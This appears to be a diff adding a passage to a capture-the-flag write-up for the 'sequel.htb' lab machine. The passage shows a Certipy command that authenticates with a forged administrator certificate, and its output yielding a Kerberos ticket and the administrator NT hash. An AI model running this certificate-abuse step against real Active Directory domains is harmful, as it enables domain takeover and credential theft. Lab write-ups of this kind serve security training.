@@ -515,6 +515,19 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 This requested the certificate for administrator
 
 ```python
+faketime -f +8h certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.7.162'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
+So after sinking the time 
 
